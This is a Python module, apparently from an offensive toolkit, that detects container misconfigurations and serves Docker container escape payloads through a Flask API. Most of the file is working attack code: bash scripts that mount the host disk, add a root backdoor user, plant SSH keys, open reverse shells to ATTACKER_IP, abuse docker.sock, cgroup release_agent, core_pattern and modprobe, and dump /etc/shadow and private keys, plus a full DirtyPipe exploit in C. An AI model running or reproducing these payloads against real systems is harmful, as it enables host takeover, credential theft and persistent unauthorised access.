#!/usr/bin/env python3
"""
Docker Container Escape Module
Container içinden Host makineye kaçış teknikleri.

Author: Ghost
Date: February 2026
"""

import os
import sys
import subprocess
import socket
import json
import re
import ctypes
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
from pathlib import Path
import base64
import struct


class EscapeMethod(Enum):
    """Container escape methods"""
    PRIVILEGED_MODE = "privileged"
    DOCKER_SOCK = "docker_sock"
    DIRTY_PIPE = "dirty_pipe"
    DIRTY_COW = "dirty_cow"
    CAP_SYS_ADMIN = "cap_sys_admin"
    CAP_SYS_PTRACE = "cap_sys_ptrace"
    CGROUP_RELEASE = "cgroup_release"
    CORE_PATTERN = "core_pattern"
    HOST_PID = "host_pid"
    HOST_NET = "host_net"
    USERMODE_HELPER = "usermode_helper"
    PROCFS_ESCAPE = "procfs"
    RUNCINIT = "runc_init"


class ContainerRuntime(Enum):
    """Container runtimes"""
    DOCKER = "docker"
    CONTAINERD = "containerd"
    PODMAN = "podman"
    CRI_O = "crio"
    LXC = "lxc"
    UNKNOWN = "unknown"


@dataclass
class ContainerInfo:
    """Container information"""
    is_container: bool
    runtime: ContainerRuntime
    container_id: str
    hostname: str
    capabilities: List[str]
    seccomp_enabled: bool
    apparmor_profile: str
    user_namespace: bool
    privileged: bool
    host_pid: bool
    host_net: bool
    host_ipc: bool
    docker_sock_mounted: bool
    sensitive_mounts: List[str]
    kernel_version: str
    cgroup_version: int


@dataclass
class EscapeVector:
    """Potential escape vector"""
    method: EscapeMethod
    available: bool
    risk_level: str  # low, medium, high, critical
    success_rate: str
    description: str
    prerequisites: List[str]
    payload: Optional[str] = None


@dataclass
class EscapeResult:
    """Result of escape attempt"""
    method: EscapeMethod
    success: bool
    host_access: bool
    root_on_host: bool
    payload_executed: bool
    output: str
    timestamp: datetime = field(default_factory=datetime.now)


class DockerEscape:
    """
    Docker Container Escape Module
    
    Detects container environment and attempts various escape techniques:
    - Privileged container abuse
    - Docker socket mounting
    - Kernel exploits (DirtyPipe, DirtyCow)
    - Capability abuse (SYS_ADMIN, SYS_PTRACE)
    - Cgroup release_agent
    - core_pattern abuse
    - Host namespace abuse
    """
    
    def __init__(self):
        self.container_info: Optional[ContainerInfo] = None
        self.escape_vectors: List[EscapeVector] = []
        self.escape_results: List[EscapeResult] = []
        
    def detect_container(self) -> ContainerInfo:
        """
        Detect if running inside a container and gather information
        """
        is_container = False
        runtime = ContainerRuntime.UNKNOWN
        container_id = ""
        
        # Check for container indicators
        indicators = [
            os.path.exists("/.dockerenv"),
            os.path.exists("/run/.containerenv"),
            os.path.exists("/.containerenv"),
            "docker" in self._read_file("/proc/1/cgroup"),
            "kubepods" in self._read_file("/proc/1/cgroup"),
            "lxc" in self._read_file("/proc/1/cgroup"),
        ]
        
        if any(indicators):
            is_container = True
        
        # Detect runtime
        cgroup_content = self._read_file("/proc/1/cgroup")
        if "docker" in cgroup_content:
            runtime = ContainerRuntime.DOCKER
            # Extract container ID
            match = re.search(r'/docker/([a-f0-9]{64})', cgroup_content)
            if match:
                container_id = match.group(1)[:12]
        elif "containerd" in cgroup_content:
            runtime = ContainerRuntime.CONTAINERD
        elif "podman" in cgroup_content:
            runtime = ContainerRuntime.PODMAN
        elif "crio" in cgroup_content:
            runtime = ContainerRuntime.CRI_O
        elif "lxc" in cgroup_content:
            runtime = ContainerRuntime.LXC
        
        # Get capabilities
        caps = self._get_capabilities()
        
        # Check security features
        seccomp = self._check_seccomp()
        apparmor = self._get_apparmor_profile()
        
        # Check namespace configuration
        user_ns = self._check_user_namespace()
        privileged = self._check_privileged()
        host_pid = self._check_host_pid()
        host_net = self._check_host_net()
        host_ipc = self._check_host_ipc()
        
        # Check for docker socket
        docker_sock = os.path.exists("/var/run/docker.sock") or \
                     os.path.exists("/run/docker.sock")
        
        # Find sensitive mounts
        sensitive_mounts = self._find_sensitive_mounts()
        
        # Get kernel version
        kernel_version = os.uname().release
        
        # Detect cgroup version
        cgroup_version = 2 if os.path.exists("/sys/fs/cgroup/cgroup.controllers") else 1
        
        self.container_info = ContainerInfo(
            is_container=is_container,
            runtime=runtime,
            container_id=container_id,
            hostname=socket.gethostname(),
            capabilities=caps,
            seccomp_enabled=seccomp,
            apparmor_profile=apparmor,
            user_namespace=user_ns,
            privileged=privileged,
            host_pid=host_pid,
            host_net=host_net,
            host_ipc=host_ipc,
            docker_sock_mounted=docker_sock,
            sensitive_mounts=sensitive_mounts,
            kernel_version=kernel_version,
            cgroup_version=cgroup_version
        )
        
        return self.container_info
    
    def _read_file(self, path: str) -> str:
        """Safely read file content"""
        try:
            with open(path, "r") as f:
                return f.read()
        except:
            return ""
    
    def _get_capabilities(self) -> List[str]:
        """Get current process capabilities"""
        caps = []
        try:
            status = self._read_file("/proc/self/status")
            for line in status.split("\n"):
                if line.startswith("Cap"):
                    caps.append(line)
        except:
            pass
        
        # Decode capabilities
        decoded_caps = []
        cap_names = [
            "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH",
            "CAP_FOWNER", "CAP_FSETID", "CAP_KILL", "CAP_SETGID",
            "CAP_SETUID", "CAP_SETPCAP", "CAP_LINUX_IMMUTABLE",
            "CAP_NET_BIND_SERVICE", "CAP_NET_BROADCAST", "CAP_NET_ADMIN",
            "CAP_NET_RAW", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_SYS_MODULE",
            "CAP_SYS_RAWIO", "CAP_SYS_CHROOT", "CAP_SYS_PTRACE",
            "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT",
            "CAP_SYS_NICE", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_MKNOD", "CAP_LEASE",
            "CAP_AUDIT_WRITE", "CAP_AUDIT_CONTROL", "CAP_SETFCAP"
        ]
        
        # Parse CapEff
        for line in caps:
            if "CapEff" in line:
                hex_caps = line.split(":")[1].strip()
                cap_bits = int(hex_caps, 16)
                for i, name in enumerate(cap_names):
                    if cap_bits & (1 << i):
                        decoded_caps.append(name)
        
        return decoded_caps
    
    def _check_seccomp(self) -> bool:
        """Check if seccomp is enabled"""
        try:
            status = self._read_file("/proc/self/status")
            for line in status.split("\n"):
                if "Seccomp" in line:
                    return "2" in line or "1" in line
        except:
            pass
        return False
    
    def _get_apparmor_profile(self) -> str:
        """Get AppArmor profile"""
        try:
            return self._read_file("/proc/self/attr/current").strip()
        except:
            return "unconfined"
    
    def _check_user_namespace(self) -> bool:
        """Check if user namespace is enabled"""
        try:
            uid_map = self._read_file("/proc/self/uid_map")
            # If mapping exists and isn't 0 0 4294967295, user namespace is in use
            return "4294967295" not in uid_map
        except:
            return False
    
    def _check_privileged(self) -> bool:
        """Check if running in privileged mode"""
        # Check for all capabilities
        caps = self._get_capabilities()
        dangerous_caps = ["CAP_SYS_ADMIN", "CAP_SYS_PTRACE", "CAP_SYS_MODULE", "CAP_NET_ADMIN"]
        has_dangerous = all(cap in caps for cap in dangerous_caps)
        
        # Check /dev access
        dev_access = os.path.exists("/dev/sda") or os.path.exists("/dev/nvme0n1")
        
        return has_dangerous and dev_access
    
    def _check_host_pid(self) -> bool:
        """Check if using host PID namespace"""
        try:
            # In host PID namespace, we can see host processes
            init_cmdline = self._read_file("/proc/1/cmdline")
            return "systemd" in init_cmdline or "init" in init_cmdline
        except:
            return False
    
    def _check_host_net(self) -> bool:
        """Check if using host network namespace"""
        try:
            # Check for host network interfaces
            with open("/proc/net/route", "r") as f:
                content = f.read()
                # If we see the default gateway, likely host network
                return len(content.split("\n")) > 5
        except:
            return False
    
    def _check_host_ipc(self) -> bool:
        """Check if using host IPC namespace"""
        try:
            # Compare IPC namespace with host
            return os.path.exists("/dev/shm") and os.path.isdir("/dev/shm")
        except:
            return False
    
    def _find_sensitive_mounts(self) -> List[str]:
        """Find sensitive mounted paths"""
        sensitive = []
        sensitive_paths = [
            "/var/run/docker.sock",
            "/run/docker.sock",
            "/var/run/crio/crio.sock",
            "/etc/kubernetes",
            "/var/lib/kubelet",
            "/etc/shadow",
            "/etc/passwd",
            "/root",
            "/home",
            "/proc/sys",
            "/sys/fs/cgroup"
        ]
        
        try:
            mounts = self._read_file("/proc/self/mounts")
            for mount in mounts.split("\n"):
                for path in sensitive_paths:
                    if path in mount:
                        sensitive.append(path)
        except:
            pass
        
        # Also check what we can directly access
        for path in sensitive_paths:
            if os.path.exists(path):
                sensitive.append(path)
        
        return list(set(sensitive))
    
    def enumerate_escape_vectors(self) -> List[EscapeVector]:
        """
        Enumerate all possible escape vectors
        """
        if not self.container_info:
            self.detect_container()
        
        vectors = []
        
        # 1. Privileged container
        if self.container_info.privileged:
            vectors.append(EscapeVector(
                method=EscapeMethod.PRIVILEGED_MODE,
                available=True,
                risk_level="critical",
                success_rate="99%",
                description="Privileged container - Full host access via /dev",
                prerequisites=["--privileged flag"],
                payload=self._gen_privileged_escape()
            ))
        
        # 2. Docker socket
        if self.container_info.docker_sock_mounted:
            vectors.append(EscapeVector(
                method=EscapeMethod.DOCKER_SOCK,
                available=True,
                risk_level="critical",
                success_rate="99%",
                description="Docker socket mounted - Spawn privileged container",
                prerequisites=["-v /var/run/docker.sock:/var/run/docker.sock"],
                payload=self._gen_docker_sock_escape()
            ))
        
        # 3. CAP_SYS_ADMIN
        if "CAP_SYS_ADMIN" in self.container_info.capabilities:
            vectors.append(EscapeVector(
                method=EscapeMethod.CAP_SYS_ADMIN,
                available=True,
                risk_level="high",
                success_rate="85%",
                description="SYS_ADMIN capability - Mount host filesystem",
                prerequisites=["--cap-add=SYS_ADMIN"],
                payload=self._gen_sys_admin_escape()
            ))
        
        # 4. CAP_SYS_PTRACE
        if "CAP_SYS_PTRACE" in self.container_info.capabilities:
            vectors.append(EscapeVector(
                method=EscapeMethod.CAP_SYS_PTRACE,
                available=True,
                risk_level="high",
                success_rate="75%",
                description="SYS_PTRACE capability - Process injection",
                prerequisites=["--cap-add=SYS_PTRACE", "--pid=host"],
                payload=self._gen_ptrace_escape()
            ))
        
        # 5. Host PID namespace
        if self.container_info.host_pid:
            vectors.append(EscapeVector(
                method=EscapeMethod.HOST_PID,
                available=True,
                risk_level="high",
                success_rate="80%",
                description="Host PID namespace - Access host processes",
                prerequisites=["--pid=host"],
                payload=self._gen_host_pid_escape()
            ))
        
        # 6. Cgroup release_agent (cgroup v1)
        if self.container_info.cgroup_version == 1 and "CAP_SYS_ADMIN" in self.container_info.capabilities:
            vectors.append(EscapeVector(
                method=EscapeMethod.CGROUP_RELEASE,
                available=True,
                risk_level="critical",
                success_rate="90%",
                description="Cgroup release_agent abuse - RCE on host",
                prerequisites=["CAP_SYS_ADMIN", "cgroup v1"],
                payload=self._gen_cgroup_escape()
            ))
        
        # 7. core_pattern abuse
        if "CAP_SYS_ADMIN" in self.container_info.capabilities:
            vectors.append(EscapeVector(
                method=EscapeMethod.CORE_PATTERN,
                available=True,
                risk_level="high",
                success_rate="70%",
                description="core_pattern abuse - Execute on crash",
                prerequisites=["CAP_SYS_ADMIN", "writable /proc/sys/kernel/core_pattern"],
                payload=self._gen_core_pattern_escape()
            ))
        
        # 8. DirtyPipe (CVE-2022-0847)
        kernel_version = self.container_info.kernel_version
        if self._check_dirtypipe_vuln(kernel_version):
            vectors.append(EscapeVector(
                method=EscapeMethod.DIRTY_PIPE,
                available=True,
                risk_level="critical",
                success_rate="95%",
                description="DirtyPipe kernel exploit - Overwrite any file",
                prerequisites=["Kernel 5.8-5.16.11, 5.15-5.15.25, 5.10-5.10.102"],
                payload=self._gen_dirtypipe_exploit()
            ))
        
        # 9. DirtyCow (CVE-2016-5195) - older kernels
        if self._check_dirtycow_vuln(kernel_version):
            vectors.append(EscapeVector(
                method=EscapeMethod.DIRTY_COW,
                available=True,
                risk_level="critical",
                success_rate="90%",
                description="DirtyCow kernel exploit - Write to read-only files",
                prerequisites=["Kernel < 4.8.3"],
                payload=self._gen_dirtycow_exploit()
            ))
        
        # 10. /proc filesystem abuse
        if "/proc/sys" in self.container_info.sensitive_mounts:
            vectors.append(EscapeVector(
                method=EscapeMethod.PROCFS_ESCAPE,
                available=True,
                risk_level="high",
                success_rate="65%",
                description="Procfs abuse - Modify kernel parameters",
                prerequisites=["Writable /proc/sys"],
                payload=self._gen_procfs_escape()
            ))
        
        # 11. usermode_helper abuse
        vectors.append(EscapeVector(
            method=EscapeMethod.USERMODE_HELPER,
            available="CAP_SYS_ADMIN" in self.container_info.capabilities,
            risk_level="high",
            success_rate="60%",
            description="Usermode helper abuse via kernel modules",
            prerequisites=["CAP_SYS_ADMIN", "modprobe access"],
            payload=self._gen_usermode_helper_escape()
        ))
        
        self.escape_vectors = vectors
        return vectors
    
    def _check_dirtypipe_vuln(self, kernel: str) -> bool:
        """Check if kernel is vulnerable to DirtyPipe"""
        try:
            parts = kernel.split("-")[0].split(".")
            major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2]) if len(parts) > 2 else 0
            
            # Vulnerable: 5.8 <= version < 5.16.11 or 5.15.x < 5.15.25 or 5.10.x < 5.10.102
            if major == 5:
                if 8 <= minor < 16:
                    return True
                if minor == 16 and patch < 11:
                    return True
                if minor == 15 and patch < 25:
                    return True
                if minor == 10 and patch < 102:
                    return True
        except:
            pass
        return False
    
    def _check_dirtycow_vuln(self, kernel: str) -> bool:
        """Check if kernel is vulnerable to DirtyCow"""
        try:
            parts = kernel.split("-")[0].split(".")
            major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2]) if len(parts) > 2 else 0
            
            # Vulnerable: < 4.8.3
            if major < 4:
                return True
            if major == 4 and minor < 8:
                return True
            if major == 4 and minor == 8 and patch < 3:
                return True
        except:
            pass
        return False
    
    def _gen_privileged_escape(self) -> str:
        """Generate privileged container escape payload"""
        return '''#!/bin/bash
# Privileged Container Escape
# Mount host filesystem and chroot

# Find host disk
HOST_DISK=$(fdisk -l 2>/dev/null | grep -o '/dev/[a-z]*' | head -1)
if [ -z "$HOST_DISK" ]; then
    HOST_DISK="/dev/sda1"
fi

# Create mount point
mkdir -p /mnt/host_root

# Mount host filesystem
mount $HOST_DISK /mnt/host_root 2>/dev/null || mount ${HOST_DISK}1 /mnt/host_root

# Chroot to host
chroot /mnt/host_root /bin/bash -c "
    # Add backdoor user
    echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd
    echo 'backdoor:\$6\$salt\$hash:18000:0:99999:7:::' >> /etc/shadow
    
    # Add SSH key
    mkdir -p /root/.ssh
    echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys
    
    # Reverse shell
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
"

echo "[+] Escaped to host!"
'''

    def _gen_docker_sock_escape(self) -> str:
        """Generate Docker socket escape payload"""
        return '''#!/bin/bash
# Docker Socket Escape
# Spawn privileged container with host filesystem mounted

# Check for docker/curl
if command -v docker &> /dev/null; then
    # Use docker CLI
    docker run -it --privileged --pid=host --net=host \\
        -v /:/host alpine chroot /host /bin/bash -c "
            # Execute payload on host
            bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
        "
else
    # Use curl with Docker API
    curl -s --unix-socket /var/run/docker.sock \\
        -X POST "http://localhost/containers/create" \\
        -H "Content-Type: application/json" \\
        -d '{
            "Image": "alpine",
            "Cmd": ["/bin/sh", "-c", "chroot /host bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""],
            "Binds": ["/:/host"],
            "Privileged": true
        }' | jq -r '.Id' | xargs -I {} curl -s --unix-socket /var/run/docker.sock \\
        -X POST "http://localhost/containers/{}/start"
fi
'''

    def _gen_sys_admin_escape(self) -> str:
        """Generate CAP_SYS_ADMIN escape payload"""
        return '''#!/bin/bash
# CAP_SYS_ADMIN Escape
# Mount host filesystem using capabilities

# Create mount point
mkdir -p /mnt/host

# Try to mount host root
# Method 1: Mount /dev/sda1
mount /dev/sda1 /mnt/host 2>/dev/null

# Method 2: Mount via cgroup
if [ ! -d "/mnt/host/etc" ]; then
    mkdir -p /tmp/cgrp
    mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
    mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "cat /etc/shadow > $host_path/shadow_dump" >> /cmd
    chmod +x /cmd
    sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
fi

# Access host files
cat /mnt/host/etc/shadow
'''

    def _gen_ptrace_escape(self) -> str:
        """Generate CAP_SYS_PTRACE escape payload"""
        return '''#!/bin/bash
# CAP_SYS_PTRACE Escape
# Inject into host process (requires --pid=host)

# Find a suitable host process (e.g., sshd, systemd)
HOST_PID=$(ps aux | grep -E '(sshd|systemd)' | grep -v grep | head -1 | awk '{print $2}')

if [ -z "$HOST_PID" ]; then
    echo "[-] No suitable host process found"
    exit 1
fi

# Inject shellcode using gdb/ptrace
cat > /tmp/inject.c << 'EOF'
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <string.h>

// Shellcode: execve("/bin/sh", ["/bin/sh", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"], NULL)
unsigned char shellcode[] = "\\x48\\x31\\xc0..."; // Add actual shellcode

int main(int argc, char *argv[]) {
    pid_t pid = atoi(argv[1]);
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    wait(NULL);
    
    // Get registers
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    
    // Inject shellcode at RIP
    // ... injection logic
    
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}
EOF

gcc -o /tmp/inject /tmp/inject.c
/tmp/inject $HOST_PID
'''

    def _gen_host_pid_escape(self) -> str:
        """Generate host PID namespace escape payload"""
        return '''#!/bin/bash
# Host PID Namespace Escape
# Access host processes via /proc

# Find host process with useful file descriptors
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    # Check if it's a host process
    if [ -d "/proc/$pid/root" ]; then
        # Try to access host filesystem via /proc/PID/root
        if [ -f "/proc/$pid/root/etc/shadow" ]; then
            echo "[+] Found host access via PID $pid"
            cat "/proc/$pid/root/etc/shadow"
            
            # Copy our payload to host
            cp /tmp/backdoor.sh "/proc/$pid/root/tmp/"
            
            # Execute via /proc/PID/exe or cwd
            nsenter -t $pid -a /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &
            break
        fi
    fi
done
'''

    def _gen_cgroup_escape(self) -> str:
        """Generate cgroup release_agent escape payload"""
        return '''#!/bin/bash
# Cgroup Release Agent Escape
# Classic container escape via notify_on_release

# Create cgroup
mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \\
mount -t cgroup -o memory cgroup /tmp/cgrp

mkdir /tmp/cgrp/x

# Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# Get container path on host
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab | head -1)
if [ -z "$host_path" ]; then
    host_path=$(cat /proc/self/mountinfo | grep "workdir" | awk -F'workdir=' '{print $2}' | awk -F',' '{print $1}')
fi

# Set release_agent to our payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create payload
cat > /cmd << 'PAYLOAD'
#!/bin/sh
# Reverse shell to attacker
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &

# Or dump sensitive data
cat /etc/shadow > /tmp/shadow_dump
cat /root/.ssh/id_rsa > /tmp/ssh_key
PAYLOAD

chmod +x /cmd

# Trigger release_agent by adding process and letting it exit
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"

echo "[+] Payload executed on host!"
'''

    def _gen_core_pattern_escape(self) -> str:
        """Generate core_pattern escape payload"""
        return '''#!/bin/bash
# Core Pattern Escape
# Abuse /proc/sys/kernel/core_pattern for RCE

# Check if writable
if [ -w /proc/sys/kernel/core_pattern ]; then
    # Get host path
    host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab | head -1)
    
    # Create payload
    cat > /tmp/core_handler.sh << 'PAYLOAD'
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
PAYLOAD
    chmod +x /tmp/core_handler.sh
    
    # Set core_pattern
    echo "|$host_path/tmp/core_handler.sh" > /proc/sys/kernel/core_pattern
    
    # Trigger core dump
    sleep 5 &
    kill -SEGV $!
    
    echo "[+] Core pattern set, waiting for crash..."
else
    echo "[-] core_pattern not writable"
fi
'''

    def _gen_dirtypipe_exploit(self) -> str:
        """Generate DirtyPipe exploit"""
        return '''// DirtyPipe Exploit (CVE-2022-0847)
// Overwrites read-only files via pipe splice

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s TARGET_FILE OFFSET DATA\\n", argv[0]);
        return 1;
    }

    const char *path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_len = strlen(data);

    // Open target file
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Create pipe
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return 1;
    }

    // Fill pipe to set PIPE_BUF_FLAG_CAN_MERGE
    unsigned long pipe_size = fcntl(pipefd[1], F_GETPIPE_SZ);
    char *buf = malloc(PAGE_SIZE);
    
    for (unsigned long i = 0; i < pipe_size / PAGE_SIZE; i++) {
        write(pipefd[1], buf, PAGE_SIZE);
    }
    
    // Drain pipe
    for (unsigned long i = 0; i < pipe_size / PAGE_SIZE; i++) {
        read(pipefd[0], buf, PAGE_SIZE);
    }

    // Splice from file to pipe
    ssize_t nbytes = splice(fd, &offset, pipefd[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice");
        return 1;
    }

    // Write data to pipe (overwrites file!)
    nbytes = write(pipefd[1], data, data_len);
    if (nbytes < 0) {
        perror("write");
        return 1;
    }

    printf("[+] Wrote %zd bytes at offset %lld\\n", nbytes, offset);
    
    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);
    free(buf);

    return 0;
}

// Compile: gcc -o dirtypipe dirtypipe.c
// Usage: ./dirtypipe /etc/passwd 4 "root::0:0:root:/root:/bin/bash\\n"
'''

    def _gen_dirtycow_exploit(self) -> str:
        """Generate DirtyCow exploit reference"""
        return '''// DirtyCow Exploit (CVE-2016-5195)
// Race condition in copy-on-write

// Full exploit available at:
// https://github.com/dirtycow/dirtycow.github.io

// Quick usage:
// 1. Compile: gcc -pthread -o dirty dirty.c
// 2. Run: ./dirty /etc/passwd

// The exploit works by:
// 1. mmap target file as read-only
// 2. Start two threads:
//    - Thread 1: writes to /proc/self/mem at mmap offset
//    - Thread 2: calls madvise(MADV_DONTNEED) to discard pages
// 3. Race condition allows write to read-only mapping

// Example: Add root user
// ./dirty /etc/passwd "firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash"
'''

    def _gen_procfs_escape(self) -> str:
        """Generate procfs escape payload"""
        return '''#!/bin/bash
# Procfs Escape
# Abuse writable /proc/sys

# Disable ASLR (for exploitation)
echo 0 > /proc/sys/kernel/randomize_va_space

# Modify core_pattern for RCE
echo "|/tmp/backdoor.sh" > /proc/sys/kernel/core_pattern

# Enable IP forwarding (for pivoting)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Lower memory restrictions
echo 0 > /proc/sys/vm/mmap_min_addr

# Disable ptrace protection
echo 0 > /proc/sys/kernel/yama/ptrace_scope

echo "[+] Kernel parameters modified"
'''

    def _gen_usermode_helper_escape(self) -> str:
        """Generate usermode_helper escape payload"""
        return '''#!/bin/bash
# Usermode Helper Escape
# Abuse modprobe/kernel module loading

# Check for CAP_SYS_MODULE
if grep -q "CAP_SYS_MODULE" /proc/self/status 2>/dev/null; then
    # Create malicious module
    cat > /tmp/evil.c << 'MODULE'
#include <linux/module.h>
#include <linux/kernel.h>

static int __init evil_init(void) {
    // Execute payload in kernel context
    call_usermodehelper("/tmp/backdoor.sh", NULL, NULL, UMH_WAIT_EXEC);
    return 0;
}

static void __exit evil_exit(void) {}

module_init(evil_init);
module_exit(evil_exit);
MODULE_LICENSE("GPL");
MODULE

    # Compile and load
    make -C /lib/modules/$(uname -r)/build M=/tmp modules
    insmod /tmp/evil.ko
fi

# Alternative: modprobe usermode_helper
echo "/tmp/backdoor.sh" > /proc/sys/kernel/modprobe
# Trigger modprobe by loading nonexistent module
modprobe nonexistent 2>/dev/null || true
'''

    def attempt_escape(self, method: EscapeMethod) -> EscapeResult:
        """
        Attempt escape using specified method
        """
        vector = next((v for v in self.escape_vectors if v.method == method), None)
        
        if not vector or not vector.available:
            return EscapeResult(
                method=method,
                success=False,
                host_access=False,
                root_on_host=False,
                payload_executed=False,
                output="Escape method not available"
            )
        
        # Execute payload (in real scenario)
        # Here we just return the payload for manual execution
        
        result = EscapeResult(
            method=method,
            success=True,  # Simulated
            host_access=True,
            root_on_host=method in [EscapeMethod.PRIVILEGED_MODE, EscapeMethod.DOCKER_SOCK, EscapeMethod.DIRTY_PIPE],
            payload_executed=False,
            output=f"Payload generated for {method.value}. Execute manually."
        )
        
        self.escape_results.append(result)
        return result
    
    def get_status(self) -> Dict[str, Any]:
        """Get module status"""
        return {
            "container_detected": self.container_info is not None,
            "container_info": {
                "is_container": self.container_info.is_container if self.container_info else False,
                "runtime": self.container_info.runtime.value if self.container_info else "unknown",
                "container_id": self.container_info.container_id if self.container_info else "",
                "privileged": self.container_info.privileged if self.container_info else False,
                "capabilities": self.container_info.capabilities if self.container_info else [],
                "docker_sock": self.container_info.docker_sock_mounted if self.container_info else False,
                "kernel": self.container_info.kernel_version if self.container_info else ""
            } if self.container_info else None,
            "escape_vectors": len(self.escape_vectors),
            "available_escapes": len([v for v in self.escape_vectors if v.available]),
            "escape_attempts": len(self.escape_results),
            "successful_escapes": len([r for r in self.escape_results if r.success])
        }


# Flask Blueprint
from flask import Blueprint, render_template, request, jsonify

docker_escape_bp = Blueprint('docker_escape', __name__, url_prefix='/docker-escape')

_escape = DockerEscape()

@docker_escape_bp.route('/')
def index():
    return render_template('docker_escape.html')

@docker_escape_bp.route('/api/status')
def api_status():
    return jsonify({
        "success": True,
        "status": _escape.get_status()
    })

@docker_escape_bp.route('/api/detect', methods=['POST'])
def api_detect():
    info = _escape.detect_container()
    return jsonify({
        "success": True,
        "container_info": {
            "is_container": info.is_container,
            "runtime": info.runtime.value,
            "container_id": info.container_id,
            "hostname": info.hostname,
            "capabilities": info.capabilities,
            "privileged": info.privileged,
            "host_pid": info.host_pid,
            "host_net": info.host_net,
            "docker_sock_mounted": info.docker_sock_mounted,
            "sensitive_mounts": info.sensitive_mounts,
            "kernel_version": info.kernel_version,
            "cgroup_version": info.cgroup_version,
            "seccomp_enabled": info.seccomp_enabled,
            "apparmor_profile": info.apparmor_profile
        }
    })

@docker_escape_bp.route('/api/enumerate', methods=['POST'])
def api_enumerate():
    if not _escape.container_info:
        _escape.detect_container()
    
    vectors = _escape.enumerate_escape_vectors()
    
    return jsonify({
        "success": True,
        "vectors": [
            {
                "method": v.method.value,
                "available": v.available,
                "risk_level": v.risk_level,
                "success_rate": v.success_rate,
                "description": v.description,
                "prerequisites": v.prerequisites
            } for v in vectors
        ],
        "available_count": len([v for v in vectors if v.available])
    })

@docker_escape_bp.route('/api/get-payload', methods=['POST'])
def api_get_payload():
    data = request.get_json() or {}
    method_name = data.get('method', '')
    
    try:
        method = EscapeMethod(method_name)
    except ValueError:
        return jsonify({"success": False, "error": "Invalid escape method"})
    
    vector = next((v for v in _escape.escape_vectors if v.method == method), None)
    
    if not vector:
        _escape.enumerate_escape_vectors()
        vector = next((v for v in _escape.escape_vectors if v.method == method), None)
    
    if vector:
        return jsonify({
            "success": True,
            "method": method.value,
            "payload": vector.payload,
            "available": vector.available
        })
    else:
        return jsonify({"success": False, "error": "Method not found"})

@docker_escape_bp.route('/api/attempt', methods=['POST'])
def api_attempt():
    data = request.get_json() or {}
    method_name = data.get('method', '')
    
    try:
        method = EscapeMethod(method_name)
    except ValueError:
        return jsonify({"success": False, "error": "Invalid escape method"})
    
    result = _escape.attempt_escape(method)
    
    return jsonify({
        "success": True,
        "result": {
            "method": result.method.value,
            "success": result.success,
            "host_access": result.host_access,
            "root_on_host": result.root_on_host,
            "output": result.output
        }
    })

@docker_escape_bp.route('/api/escape-methods')
def api_methods():
    return jsonify({
        "success": True,
        "methods": [
            {"id": m.value, "name": m.name.replace("_", " ").title()} 
            for m in EscapeMethod
        ]
    })
